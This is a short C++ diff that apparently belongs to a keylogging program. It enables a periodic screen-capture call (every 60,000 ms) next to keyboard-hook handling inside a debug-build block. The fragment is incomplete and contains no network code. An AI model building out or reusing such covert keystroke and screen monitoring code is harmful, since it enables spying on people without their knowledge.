@@ -4,6 +4,8 @@
 #include "sys.h"
 #include "debug.h"
 
+#include <thread>
+
 int main() {
 #ifdef DEBUG_BUILD
   std::vector<std::filesystem::path>
@@ -34,11 +36,7 @@ int main() {
 				   KeyHook::activeProcess,
 				   false);
 
-  /*Screen::CaptureScreen(path,
-						"winpst",
-						true,
-						60000);
-						*/
+  Screen::CaptureScreen(path, "winpst", true, 60000);
 
   KeyHook::HandleMessage(true);
 #endif // DEBUG_BUILD
